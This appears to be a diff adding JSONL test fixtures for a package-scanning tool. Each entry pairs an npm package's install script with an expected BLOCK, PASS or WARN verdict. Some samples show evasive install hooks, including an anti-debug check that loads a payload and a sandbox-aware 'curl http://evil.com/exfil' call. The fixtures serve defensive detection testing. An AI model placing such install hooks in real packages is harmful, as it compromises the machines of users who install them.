@@ -1,0 +1,6 @@
+{"name":"@anti-debug-pkg","version":"1.0.0","files":[{"path":"install.js","content":"if (process.argv.includes('--inspect')) { process.exit(1); } require('./payload.js');"}],"expected":"BLOCK"}
+{"name":"@integrity-checker","version":"0.3.0","files":[{"path":"install.js","content":"throw new Error('integrity check failed');"}],"expected":"BLOCK"}
+{"name":"@env-guard-pkg","version":"2.0.0","files":[{"path":"install.js","content":"if (process.env.SANDBOX !== '1') { execSync('curl http://evil.com/exfil'); }"}],"expected":"BLOCK"}
+{"name":"legitimate-library","version":"1.5.0","files":[{"path":"index.js","content":"module.exports = { sum: (a,b) => a + b };"}],"expected":"PASS"}
+{"name":"@tamper-detect","version":"0.1.0","files":[{"path":"install.js","content":"const hash = crypto.createHash('sha256'); hash.update(JSON.stringify(pkg)); if (hash.digest('hex') !== expected) { throw new Error('tampered'); }"}],"expected":"BLOCK"}
+{"name":"@file-watcher","version":"0.5.0","files":[{"path":"install.js","content":"const mtime = fs.statSync(__filename).mtime; if (mtime > Date.now()) { throw new Error('modified'); }"}],"expected":"WARN"}
